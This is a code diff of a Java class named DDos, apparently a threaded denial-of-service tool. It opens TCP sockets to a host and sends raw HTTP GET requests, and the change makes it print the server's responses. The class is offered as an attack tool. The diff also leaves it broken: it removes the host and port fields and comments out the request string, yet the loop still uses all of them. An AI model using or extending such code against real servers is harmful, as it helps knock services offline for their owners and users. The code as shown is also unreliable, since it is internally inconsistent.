@@ -8,15 +8,9 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class DDos {
-    private String host;
-    private int port;
-    private DDosType type;
     private int threadNumber;
 
-    public DDos(String host, int port, DDosType type, int threadNumber) {
-        this.host = host;
-        this.port = port;
-        this.type = type;
+    public DDos(SocketRequestBuild socketRequestBuild, int threadNumber) {
         this.threadNumber = threadNumber;
     }
 
@@ -25,10 +19,10 @@ public class DDos {
             Socket tcpSocket = null;
             try {
                 tcpSocket = new Socket(host, port);
-                String httpGetRequestData = "GET / HTTP/1.1\r\nHOST: " + host + "\r\n\r\n";
+                //String httpGetRequestData = "GET / HTTP/1.1\r\nHOST: " + host + "\r\n\r\n";
                 IOUtil.write(httpGetRequestData, tcpSocket.getOutputStream(), "UTF-8", false);
                 byte[] data = IOUtil.read(tcpSocket.getInputStream());
-                System.out.println(data.length);
+                System.out.println(new String(data));
                 tcpSocket.close();
             } finally {
                 IOUtil.close(tcpSocket);
